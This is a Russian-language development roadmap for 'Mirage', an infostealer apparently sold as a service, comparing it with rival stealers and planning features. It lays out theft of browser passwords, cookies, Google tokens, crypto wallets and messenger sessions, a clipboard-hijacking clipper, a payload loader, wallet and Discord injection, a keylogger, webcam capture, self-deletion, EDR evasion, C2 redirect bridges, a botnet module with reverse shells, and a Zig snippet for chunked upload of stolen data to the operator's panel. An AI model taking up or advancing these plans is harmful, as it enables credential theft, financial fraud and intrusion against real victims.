# Mirage — Функции для внедрения

Анализ конкурентов: VoltaStealer, Ankari Stealer, STORM, TheVoid
Текущий статус Mirage: Phase 1-7 ✅ (127/127), Phase 10 — 0/12

---

## 1. STEALER ENGINE (ЯДРО)

### 1.1 Server-Side Processing (SSP)

**Вдохновение:** STORM (ключевая фича), TheVoid

**Суть:** Билд НЕ открывает SQLite на машине жертвы. Нет вызовов sqlite3.dll, NSS libs. Билд только копирует сырые `.db` файлы + извлекает мастер-ключ → отправляет на сервер. Расшифровка на C# Panel.

| Аспект | Volta | Ankari | STORM | TheVoid | Mirage сейчас |
|--------|-------|--------|-------|---------|---------------|
| SSP | ❌ | ❌ | ✅ | ✅(XOR) | ❌ (расшифровка на билде) |

**Что даёт:**
- Билд не касается SQLite → меньше подозрительных операций ввода-вывода
- Билд не загружает nss3.dll / bcrypt для расшифровки → меньше импортов
- Время работы билда сокращается
- Весь криптографический код остаётся на сервере
- Можно обновлять алгоритмы расшифровки без пересборки билда

**План:**
1. На билде (Zig): копировать Login Data, Cookies, Web Data, History, Local State как есть
2. Извлечь мастер-ключ из Local State (DPAPI / App-Bound / OSCrypt)
3. Отправить ключ + сырые .db файлы на сервер
4. На сервере (C#): SQLite парсинг (порт sqLoot на C# или Microsoft.Data.Sqlite)
5. Расшифровка AES-GCM через BCrypt на .NET
6. App-Bound: извлечение ключа через COM Elevator на билде → отправка на сервер

**Сложность:** Высокая (3 дня)
**Статус:** В плане Phase 10 (#2)

---

### 1.2 Динамический поиск браузеров (Browser Scanner)

**Вдохновение:** VoltaStealer (100+ browser), STORM (dynamic scan)

**Суть:** Вместо хардкода 46 путей — сканирование директорий на наличие профилей браузеров.

| Аспект | Volta | Ankari | STORM | TheVoid | Mirage сейчас |
|--------|-------|--------|-------|---------|---------------|
| Браузеры | 100+ dynamic | Many | Dynamic (~20 hard) | ~20 hardcoded | 46 hardcoded |

**Алгоритм:**
```
1. Сканировать %LOCALAPPDATA% на папки с "User Data\Local State"
2. Читать Local State JSON → есть "os_crypt" → Chromium браузер
3. Определить имя браузера по имени папки
4. Найти все профили (Default, Profile N)
5. Сканировать %APPDATA% на profiles.ini → Gecko браузеры
6. Найденные → собрать данные со всех профилей
```

**Что даёт:**
- 100+ браузеров без обновления (любой Chromium форк)
- Portable версии браузеров
- Оверлейные приложения на Chromium движке
- Новые/экзотические браузеры на следующий день после выхода

**Сложность:** Средняя (1 день)
**Статус:** В плане Phase 10 (#12)

---

### 1.3 Чанковая отправка данных (Chunked Upload)

**Вдохновение:** VoltaStealer (ключевая фича)

**Суть:** Отправка архива частями по 1 MB. Если билд прерван — часть данных уже на сервере.

| Аспект | Volta | Ankari | STORM | TheVoid | Mirage сейчас |
|--------|-------|--------|-------|---------|---------------|
| Chunks | ✅ | ❌ | ❌ | ✅(per-file) | ❌ (весь архив одним POST) |

**Алгоритм:**
```zig
const CHUNK = 1024 * 1024; // 1MB
var offset: usize = 0;
while (offset < data.len) {
    const end = @min(offset + CHUNK, data.len);
    http.post("/api/log/chunk", data[offset..end]);
    offset = end;
}
http.post("/api/log/complete", &[_]u8{});
```

**API новые эндпоинты:**
- `POST /api/log/chunk` — принять чанк (session_id + chunk_index + data)
- `POST /api/log/complete` — финализировать сборку

**Сложность:** Средняя (1-2 дня)
**Статус:** В плане Phase 10 (#10)

---

### 1.4 Улучшение syscall стойкости

**Вдохновение:** STORM (Indirect syscalls + JIT stubs + FreshyCalls), Ankari (runtime encryption)

**Что делают конкуренты:**
| Техника | STORM | Ankari | TheVoid | Mirage |
|---------|-------|--------|---------|--------|
| Indirect syscalls | ✅ JIT stubs | ✅ | ✅ ver 1.4 | ✅ Halo's Gate |
| SSN resolution | ✅ FreshyCalls | ❓ | ✅ | ✅ Halo's Gate |
| Gadget pool | ✅ | ❓ | ❓ | ✅ 64 gadgets |
| NTDLL unhook | ✅ | ❓ | ❓ | ❌ |
| EDR stack spoof | ✅ ver 20.06 | ❓ | ❓ | ❌ |
| Syscall encryption | ❓ | ✅ runtime | ❓ | ❌ |
| Metamorphism | ❓ | ✅ ASM | ✅ ver 1.0 | ❌ (build-time only) |

**Что добавить:**
1. **NTDLL unhook** — снять userland хуки с ntdll.dll перед вызовом сисколов
2. **Stack spoofing** — подмена стека вызовов для обхода EDR (резервная копия RSP, подмена Return Address)
3. **FreshyCalls** — динамическая генерация заглушек сисколов (каждый вызов через новый stub)
4. **Runtime syscall obfuscation** — шифрование SSN перед вызовом, расшифровка в рантайме
5. **Metamorphism** — изменение базовых блоков ASM при каждой сборке (OLLVM-based или кастомный)

**Сложность:** Средняя-Высокая
**Статус:** Частично в плане Phase 10

---

## 2. СБОР ДАННЫХ (DATA THEFT EXPANSION)

### 2.1 Браузеры — расширение покрытия

**Mirage сейчас:** 36 Chromium + 10 Gecko = 46
**Цель:** 100+ Chromium + 30+ Gecko (как Volta)

**Добавить Chromium (из Volta):**
- Chrome Canary, Chrome Dev, Chrome Beta
- Edge Beta, Edge Dev, Edge Canary
- Brave Beta, Brave Nightly
- Vivaldi Snapshot
- Opera Beta
- CryptoTab Browser
- Avast Secure Browser
- CCleaner Browser
- UC Browser
- QQ Browser, 360 Browser, Liebao
- и другие экзотические

**Добавить Gecko (из Volta):**
- Waterfox Classic, Waterfox Current
- Firefox Beta, Firefox Nightly, Firefox Dev
- LibreWolf, Floorp, GNU IceCat
- Thunderbird
- Basilisk, K-Meleon, BlackHaw

**Сложность:** Низкая (просто добавить пути)
**Статус:** Нужно добавить

---

### 2.2 Google OAuth Tokens

**Вдохновление:** VoltaStealer, STORM

**Сейчас:** Mirage не собирает Google токены.

**Что собирать:**
- Chromium `Token Service` → Accounts → tokens
- MultiLogin, GAIA ID, etc.
- Токены авторизации Google аккаунтов
- **Refresh Tokens** для восстановления доступа (STORM Cookie Restore)
- Outlook OAuth tokens (STORM)

**Эндпоинт панели:** Restore кук через SOCKS5 прокси (как STORM)

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 2.3 Криптокошельки — расширение

**Mirage сейчас:** 62 расширения + 10 десктопных = 72
**Volta:** 60+ (расширения + десктоп)

**Добавить расширения (из Volta, STORM):**
- Slope, Rise, HaloWallet, FuelWallet
- Lace, DPal, Alby
- HOT (Hogwarts Treasury)
- 2FAS Authenticator, 2FAAuthenticator
- KeepassXC, Norton Password Manager, Avira Password Manager
- Passky PM, Padloc PM
- Notion Web Clipper, Evernote, OneNote, Google Keep

**Добавить десктопные (из Volta):**
- Bitcoin Core, Litecoin Core
- Dogecoin Core, Dash Core
- Armory, Bytecoin
- MultiDoge, ElectrumLTC
- ElectronCash, Zcoin (Firo)
- BitcoinGold

**Глубокий сбор (Volta):** `wallet.dat`, конфиги, ключи реестра

**Сложность:** Низкая (добавить пути/ID)
**Статус:** В плане Phase 10 частично

---

### 2.4 Regex-граббер (In-Memory Scan)

**Вдохновление:** VoltaStealer (BIP39, private keys)

**Суть:** Сканирование `.txt` / `.doc` / `.docx` в памяти по маскам:
- BIP39 seed phrases (12/18/24 words)
- Private keys (BTC, ETH, SOL, XMR и др.)
- API keys, tokens
- JWT tokens

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 2.5 Messenger — расширение

**Mirage сейчас:** Discord (LevelDB), Telegram (tdata), Signal, Pidgin

**Вдохновление:** Volta, STORM, TheVoid

| Клиент | Volta | Ankari | STORM | TheVoid | Mirage |
|--------|-------|--------|-------|---------|--------|
| Telegram + моды | ✅ 20+ | ✅ | ✅ | ✅ | ✅ (std) |
| AyuGram | ✅ | ✅ | ✅ | ❓ | ❌ |
| 64Gram | ✅ | ❓ | ❓ | ❓ | ❌ |
| Kotatogram | ✅ | ❓ | ❓ | ❓ | ❌ |
| Nekogram | ✅ | ❓ | ❓ | ❓ | ❌ |
| Forkgram | ✅ | ❓ | ❓ | ❓ | ❌ |
| Unigram | ✅ | ❓ | ❓ | ❓ | ❌ |
| iMe | ✅ | ❓ | ❓ | ❓ | ❌ |
| Session | ❓ | ❓ | ✅ | ❓ | ❌ |
| Tox/uTox | ❓ | ❓ | ✅ | ❓ | ❌ |
| Skype | ❓ | ❓ | ✅ | ❓ | ❌ |
| Viber | ❓ | ❓ | ✅ | ❓ | ❌ |
| Element (Matrix) | ❓ | ❓ | ✅ | ❓ | ❌ |
| Desktop WhatsApp | ❓ | ❓ | ✅ | ❓ | ❌ |
| Outlook OAuth | ❓ | ❓ | ✅ | ❓ | ❌ |

**План:**
1. Telegram моды — расширить список клиентов (AyuGram, 64Gram, Kotatogram и др.)
2. Session, Tox/uTox, Skype, Viber, Element, WhatsApp Desktop
3. Outlook OAuth tokens + классические учетные данные Outlook
4. Discord с MFA токенами + зашифрованными токенами

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 2.6 Gaming — расширение

**Mirage сейчас:** Steam, Uplay, Minecraft, Battle.net, Roblox

**Вдохновление:** STORM, Ankari

| Платформа | Ankari | STORM | TheVoid | Mirage |
|-----------|--------|-------|---------|--------|
| Epic Games | ❓ | ✅ | ❓ | ❌ |
| Riot Games | ❓ | ✅ | ❓ | ❌ |
| Ubisoft/Uplay | ✅ | ✅ | ❓ | ✅ |
| Steam | ✅ | ❓ | ✅ | ✅ |
| Minecraft | ❓ | ❓ | ❓ | ✅ |
| Battle.net | ❓ | ❓ | ❓ | ✅ |

**Добавить:**
- Epic Games Store — сбор auth data
- Riot Games — League of Legends / Valorant учетные данные

**Сложность:** Низкая-Средняя
**Статус:** Нужно добавить

---

### 2.7 VPN, FTP, Email клиенты

**Mirage сейчас:** ❌ Отсутствует

**Вдохновение:** STORM, Ankari, TheVoid

| Категория | STORM | Ankari | TheVoid | Volta | Mirage |
|-----------|-------|--------|---------|-------|--------|
| VPN | ✅ | ✅ | ❓ | ✅ | ❌ |
| FTP | ✅(FileZilla) | ❓ | ✅(FileZilla) | ❓ | ❌ |
| Email | ✅(Outlook OAuth) | ❓ | ❓ | ❓ | ❌ |
| WiFi пароли | ✅ | ❓ | ❓ | ❓ | ✅ (есть) |

**VPN (11):**
NordVPN, OpenVPN, ProtonVPN, ExpressVPN, Surfshark, CyberGhost, PIA, Windscribe, TunnelBear, Hotspot Shield, VyprVPN

**FTP (8):**
FileZilla, WinSCP, Total Commander, Far Manager, CuteFTP, SmartFTP, FlashFXP, CoreFTP

**Email (6):**
Outlook (OAuth + классические), Thunderbird, Foxmail, eM Client, Windows Mail, Mailbird

**Сложность:** Низкая (копирование конфигов по путям) — ~200 строк
**Статус:** В плане Phase 10 (#9)

---

### 2.8 Системная информация — расширение

**Вдохновление:** STORM

**Mirage сейчас:** OS, CPU/GPU/RAM, network, WiFi, screenshot, grabber

**Добавить:**
- Список запущенных процессов (STORM)
- Список установленных приложений (STORM)
- Буфер обмена (STORM, Volta)
- Информация о способе запуска (Launch Mode: Disk/Memory)
- GPU детали

**Сложность:** Низкая
**Статус:** Нужно добавить

---

### 2.9 Файл-граббер — улучшение

**Mirage сейчас:** Базовый grabber по маске из Desktop/Documents/Downloads

**Вдохновение:** STORM (мощный модуль), TheVoid

**Улучшить:**
1. Поиск по именам (маски) + расширениям
2. Глубина рекурсивного поиска
3. Максимальный размер файла
4. Кэширование путей (защита от дубликатов)
5. Сжатие перед отправкой
6. Множественные правила поиска: путь + маска включения + маска исключения + лимит

**Сложность:** Средняя
**Статус:** Нужно добавить (база есть)

---

## 3. ДОПОЛНИТЕЛЬНЫЕ МОДУЛИ (ADD-ONS)

### 3.1 Clipper

**Mirage сейчас:** ❌ Отсутствует
**Volta:** ✅ Нерезидентный, 6+ монет (BTC, ETH, TRX, XMR, SOL, TON)

**Что делать:**
- Работает до перезагрузки ПК жертвы
- Подмена адресов в буфере обмена
- Монеты: BTC (Legacy + SegWit + bech32), ETH + EVM, TRX, XMR, SOL, TON
- Использование `SetWindowsHookEx` или `OpenClipboard` polling

**Сложность:** Низкая (~100 строк)
**Статус:** В плане Phase 10 (#1)

---

### 3.2 Loader

**Mirage сейчас:** ❌ Отсутствует
**STORM:** ✅ до 10 файлов (exe, dll, ps1)
**Volta:** ✅ нерезидентный

**Что делать:**
- Загрузка файла по прямой ссылке после отработки стилера
- Указание целевой директории
- Типы файлов: exe (CreateProcess), dll (LdrLoadDll), ps1 (powershell -exec bypass)
- Расширение переменных окружения в путях

**Сложность:** Низкая
**Статус:** В плане Phase 10 (#4)

---

### 3.3 Wallet Injection

**Mirage сейчас:** ❌ Отсутствует

**Что делать:**
- Подмена app.asar в Exodus / Atomic Wallet
- HTTP GET инжект-скрипта → NtWriteFile → перезапись app.asar
- License file ← webhook URL

**Сложность:** Средняя
**Статус:** В плане Phase 10 (#3)

---

### 3.4 Discord Injection

**Mirage сейчас:** ❌ (только LevelDB token extraction)
**Skuld reference:** ✅ JS injection в Discord desktop core

**Что делать:**
1. JS инжект в `discord_desktop_core/index.js`
2. Bypass BetterDiscord — замена webhook URL
3. Bypass TokenProtector — убить процесс + удалить защитные файлы

**Сложность:** Средняя (~170 строк)
**Статус:** В плане Phase 10 (#6)

---

### 3.5 Keylogger

**Mirage сейчас:** ❌ Отсутствует

**Что делать:**
- `SetWindowsHookEx(WH_KEYBOARD_LL)` — low-level keyboard hook
- Запись нажатий в память
- Отправка на сервер вместе с основным архивом

**Сложность:** Средняя (~150 строк)
**Статус:** В плане Phase 10 (#7)

---

### 3.6 Webcam Capture

**Mirage сейчас:** ❌ Отсутствует

**Что делать:**
- AVICAP32 техника: `capCreateCaptureWindowW` → `WM_CAP_DRIVER_CONNECT` → `WM_CAP_EDIT_COPY` → Clipboard → Save

**Сложность:** Низкая (~80 строк)
**Статус:** В плане Phase 10 (#8)

---

### 3.7 Self-Delete + Melt

**Mirage сейчас:** ❌ Отсутствует
**Все конкуренты:** ✅ Есть

**Win10:** `MoveFileEx(exe, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)`
**Win11 24H2:** `FILE_DISPOSITION_INFORMATION` with `DeleteFile`
**Fallback:** `cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 & del {exe}`

**Сложность:** Низкая
**Статус:** В плане Phase 10 (#4 частично)

---

## 4. ИНФРАСТРУКТУРА (INFRASTRUCTURE)

### 4.1 Прокладки (Redirect Proxies / Bridges)

**Mirage сейчас:** ❌ Отсутствует

**Что делают конкуренты:**

| Тип прокладки | Volta | STORM | TheVoid | Mirage |
|---------------|-------|-------|---------|--------|
| Telegram пост | ✅ | ❓ | ❓ | ❌ |
| TON транзакция | ✅ | ❓ | ❓ | ❌ |
| Steam профиль | ✅ | ❓ | ❓ | ❌ |
| VPS Bridge (SSH) | ❓ | ✅ | ❓ | ❌ |
| Nginx reverse | ❓ | ❓ | ✅ | ❌ |
| GitHub Releases | ❓ | ❓ | ❓ | ❌ |

**Уровни (Level 1-3):**
- **Level 1 — Telegram:** билд → GET `t.me/{channel}/{post}` → парсинг C2 из поста
- **Level 2 — GitHub:** билд → `/repos/{user}/{repo}/releases` → C2 в описании
- **Level 3 — VPS Bridge:** Жертва → SSH tunnel → VPS → C2 сервер

**STORM подход:** Bridges как полноценные приёмники, а не только редиректы. Если основной сервер упал — прокладки продолжают принимать трафик.

**Сложность:** Средняя (1 день)
**Статус:** В плане Phase 10 (#11)

---

### 4.2 Telegram Proxy — улучшение

**Mirage сейчас:** Есть базовый TelegramBot для уведомлений (один бот)

**Volta:** До 15 ботов, настройка: страна, тег, билд, счётчики

**Что добавить:**
- Поддержка нескольких Telegram ботов (3/7/15 по тарифам)
- Фильтрация: страна, тег билда, тип данных
- Настройка отображаемых данных в уведомлении
- Discord webhook уведомления (STORM)
- Кастомные HTTP уведомления (STORM)

**Сложность:** Низкая-Средняя
**Статус:** Нужно добавить

---

## 5. ПАНЕЛЬ УПРАВЛЕНИЯ (PANEL)

### 5.1 Фильтры и поиск

**Mirage сейчас:** Базовый текстовый поиск по паролям (1 endpoint)

**Volta Smart Filters:**
- Фильтр по стране, IP, дате (от/до), тегу билда
- Текстовый поиск
- Детект дубликатов по HWID/IP с счётчиком
- Автотегирование логов по доменам/условиям (Pro+)
- Цветные метки в таблице (Pro+)
- Поиск по типу кошелька (Pro+)
- Поиск по ОС (Pro+)
- Смарт-поиск по всем данным сразу (Pro+)
- Быстрые пресеты дат: сегодня / вчера / за 7 дней

**Что добавить:**
1. Расширенная таблица логов с фильтрацией
2. Детект дубликатов (HWID + IP)
3. Автотегирование по доменам
4. Каталог готовых фильтров: Steam, крипто-сайты, почта
5. Поиск по кошелькам, браузерам, ОС

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 5.2 Лог-карточка (Session Detail)

**Volta карточка лога:**
- ID лога, ОС, браузер, IP, страна, временная метка
- Количество паролей, куков, кошельков — по категориям
- **Реальные названия кошельков**
- **Просмотр паролей прямо в карточке**
- Комментарии к логам
- Просмотр архива прямо в панели (без скачивания ZIP)
- Форматы выдачи: JSON, HTML, ZIP

**Mirage сейчас:** Есть базовая Session Detail страница

**Что добавить:**
1. Просмотр паролей в карточке (кнопка "показать")
2. Названия кошельков с иконками
3. Превью архива в браузере
4. Комментарии к логам
5. Массовый экспорт (JSON, HTML, ZIP) без ограничений (Volta Basic)
6. Отметка просмотренных логов

**Сложность:** Средняя
**Статус:** Нуждо добавить

---

### 5.3 Билдер — улучшение

**Mirage сейчас:** PE patching через WPF билдер. Базовая конфигурация.

**Что делают конкуренты:**

| Функция | Volta | STORM | TheVoid | Mirage |
|---------|-------|-------|---------|--------|
| Теги билдов | ✅ | ❓ | ✅ | ❌ |
| Счётчик скачиваний | ✅ | ❓ | ❓ | ❌ |
| Своя иконка | ✅ | ❓ | ❓ | ❌ |
| Свой манифест | ✅ | ❓ | ❓ | ❌ |
| Отключение модулей | ✅ гибко | ✅ гибко | ✅ конфиг | ❌ |
| Кастомный startup delay | ❓ | ✅ | ❓ | ❌ |
| Domain Detect конфиг | ✅ | ✅ | ❓ | ❌ |

**Что добавить:**
1. Теги билдов — каждый лог с меткой источника
2. Отключение сбора отдельных модулей (пароли/куки/кошельки)
3. Кастомная иконка и манифест
4. Startup delay (кастомная задержка перед запуском)

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 5.4 Team / Multi-user

**Вдохновение:** Volta Team ($650), STORM team

| Функция | Volta Team | STORM | TheVoid | Mirage |
|---------|------------|-------|---------|--------|
| Суб-аккаунты | ✅ до 10 | ✅ workers | ✅ workers | ❌ |
| Роль Traffer | ✅ | ❓ | ✅ | ❌ |
| Роль Checker | ✅ (session lock) | ❓ | ✅ | ❌ |
| Роль Vbiver | ✅ | ❓ | ❓ | ❌ |
| Инвайт-коды | ✅ | ❓ | ❓ | ❌ |
| Лог активности | ✅ | ❓ | ❓ | ❌ |
| Управление банами | ✅ | ❓ | ❓ | ❌ |
| API | ✅ (Pro+) | ❌ (в разработке) | ✅ | ❌ |

**Что добавить:**
1. Система ролей (админ, траффер, чекер, вбивер)
2. Создание воркеров через инвайт-коды
3. Session lock — чекер взял лог → остальные не видят
4. Лог активности воркеров
5. Баны по HWID/IP

**Сложность:** Высокая
**Статус:** Нужно добавить

---

### 5.5 Cookie Restore / Google Restore

**Вдохновение:** STORM, TheVoid

**Что делает STORM:**
- Восстановление живых кук Google и Access Token
- Использование Refresh токенов Google
- Для доступа → та же SOCKS5 прокси, что использовалась для восстановления

**Что добавить:**
1. Функция в панели: загрузить куки + прокси → получить живую сессию
2. Автоматическая ротация прокси

**Сложность:** Средняя
**Статус:** Нужно добавить

---

### 5.6 Публичная статистика

**Вдохновение:** TheVoid

**Что есть в TheVoid:**
- Публичная ссылка на статистику (по всем логам или по тегам)
- Метрики: кол-во логов, крипто-логов, процентное соотношение
- Локальные и глобальные дубли
- Пустышки и их процент
- Geo-распределение: флаг + страна + кол-во

**Сложность:** Низкая
**Статус:** Нужно добавить

---

### 5.7 Database Upgrade

**Mirage сейчас:** SQLite (EF Core)

**Volta:** PostgreSQL — миллионы строк логов, миллисекундные запросы

**Опции:**
1. Оставить SQLite (проще, не требует сервера)
2. Добавить поддержку PostgreSQL для больших нагрузок
3. Разделение: SQLite для дев/одиночки, PostgreSQL для Team

**Сложность:** Средняя
**Статус:** Нужно обсудить

---

## 6. GEOBLOCK & EVASION (УЛУЧШЕНИЯ)

### 6.1 Geo-block — тройная проверка (Volta)

**Mirage сейчас:** Есть базовая проверка (раскладка клавиатуры, язык системы — не уверен)

**Volta:**
1. IP-геолокация
2. Раскладка системной клавиатуры
3. Язык системы
4. Серверная валидация при загрузке логов

**Что добавить:**
- Серверная валидация в Panel (повторная проверка при загрузке)
- Geo-block встроен в бинарь + на сервере
- Страны СНГ + бывший СССР

**Сложность:** Низкая
**Статус:** Нужно уточнить текущий геоблок

---

### 6.2 AntiVM / AntiDebug — усиление

**Что добавить из STORM/TheVoid:**
- Обход DBSC (Chrome 147 cookies) — STORM уникальная разработка
- Registry hook removal — снятие хуков реестра в user-space
- Улучшенные EDR evasion техники

**Сложность:** Средняя
**Статус:** Нужно добавить

---

## 7. RESIDENT MODULE (ЗАКРЕП)

**Вдохновение:** TheVoid (ботнет-модуль)

**Функции резидентного модуля (TheVoid):**
1. Скачать и запустить файл
2. Выполнить PS1 скрипт
3. Выполнить CMD / PS команду
4. Запуск DLL через RunDLL32
5. MSI пакет
6. Запуск EXE напрямую в память
7. Reverse Proxy (прокси трафика)
8. Reverse CMD
9. Reverse PowerShell
10. Самоудаление
11. Самообновление
- Связь через блокчейн (невозможно заблокировать)

**Сложность:** Высокая
**Статус:** Нужно добавить (Phase 10+)

---

## 8. ПРИОРИТЕТЫ

### P0 — Максимальный профит (сделать первым)
| # | Модуль | Время | Влияние |
|---|--------|-------|---------|
| 1 | Clipper | 1 день | 💰💰💰💰💰 |
| 2 | Loader | 1 день | 💰💰💰💰 |
| 3 | Dynamic Browser Scan | 1-2 дня | 📈 coverage 46→100+ |
| 4 | Self-Delete + Melt | 0.5 дня | 🛡️ opsec |

### P1 — Ключевые улучшения
| # | Модуль | Время | Влияние |
|---|--------|-------|---------|
| 5 | Server-Side Processing | 3 дня | 🛡️ stealth |
| 6 | Чанковая отправка | 1-2 дня | 🛡️ reliability |
| 7 | Google OAuth Tokens | 1-2 дня | 💰💰💰 |
| 8 | Поиск и фильтры панели | 2 дня | 🎯 usability |

### P2 — Расширение покрытия
| # | Модуль | Время | Влияние |
|---|--------|-------|---------|
| 9 | Regex-граббер | 1 день | 💰💰💰 |
| 10 | VPN/FTP/Email | 2 дня | 💰💰💰 |
| 11 | Telegram моды + мессенджеры | 2 дня | 📈 coverage |
| 12 | Wallet Injection | 1 день | 💰💰💰💰 |
| 13 | Прокладки (Bridges) | 2 дня | 🛡️ stealth |

### P3 — Премиум функции
| # | Модуль | Время | Влияние |
|---|--------|-------|---------|
| 14 | Multi-user / Team | 3-5 дней | 💰 Team тариф |
| 15 | Discord Injection | 2 дня | 💰💰💰 |
| 16 | Keylogger | 2 дня | 💰💰 |
| 17 | Cookie Restore | 2 дня | 🎯 utility |
| 18 | Публичная статистика | 0.5 дня | 🎯 marketing |
| 19 | NTDLL Unhook + Stack Spoofing | 2-3 дня | 🛡️ EDR bypass |

### P4 — Нишевые / будущие
| # | Модуль | Время | Влияние |
|---|--------|-------|---------|
| 20 | Epic Games, Riot Games | 1 день | 📈 coverage |
| 21 | Webcam | 1 день | 💰 |
| 22 | Resident Module (ботнет) | 5+ дней | 💰💰💰💰 |
| 23 | Metamorphism (OLLVM) | 3+ дня | 🛡️ FUD |
| 24 | PostgreSQL upgrade | 2-3 дня | ⚡ performance |

---

## 9. СРАВНИТЕЛЬНАЯ ТАБЛИЦА

| Функция | Volta $250 | Ankari $70 | STORM priv | TheVoid $250 | **Mirage (сейчас)** | **Mirage цель** |
|---------|-----------|-----------|------------|-------------|--------------------|---------|
| Язык | C+ASM | Rust | C++ no std | C/C++ | **Zig** | **Zig** |
| Вес | ~210 KB | ? | ~460 KB | <600 KB | **123 KB** | **<200 KB** |
| Браузеры | 100+ | Many | Dynamic | ~20 | 46 | **100+** |
| Server-Side Decrypt | ❌ | ❌ | ✅ | ✅ | ❌ | **✅** |
| Chunked Upload | ✅ | ❌ | ❌ | ✅(per-file) | ❌ | **✅** |
| Clipper | ✅ 6+ | ❌ | ❌ | ❌ | ❌ | **✅ 6+ coins** |
| Loader | ✅ | ✅ DLL | ✅ 10 files | ✅ | ❌ | **✅** |
| Прокладки | ✅ TG/TON/Steam | ❌ | ✅ Bridges | ✅ Nginx | ❌ | **✅** |
| Self-delete | ✅ | ✅ | ✅ | ✅ | ❌ | **✅** |
| Regex-граббер | ✅ | ❌ | ❌ | ❌ | ❌ | **✅** |
| Google Tokens | ✅ | ❌ | ✅ | ❌ | ❌ | **✅** |
| VPN/FTP/Email | ✅ | ❌ | ✅ | ❌ | ❌ | **✅** |
| Telegram моды | ✅ 20+ | ❌ | ✅ | ❌ | 1 | **20+** |
| Discord Injection | ❌ | ❌ | ❌ | ❌ | ❌ | **✅** |
| Keylogger | ❌ | ❌ | ❌ | ❌ | ❌ | **✅** |
| Webcam | ❌ | ❌ | ❌ | ❌ | ❌ | **✅** |
| Smart Filters | ✅ | ❌ | ✅ | ✅ | ❌ | **✅** |
| Multi-user | ✅ Team $650 | ❌ | ✅ | ✅ | ❌ | **✅ Team** |
| API | ✅ Pro+ | ❌ | ❌ | ✅ | ❌ | **✅ Pro+** |
| Cookie Restore | ❌ | ❌ | ✅ | ✅ | ❌ | **✅** |
| Цена/мес | $250-650 | $70-150 | Private | $250 | **Free** | **$70-350** |
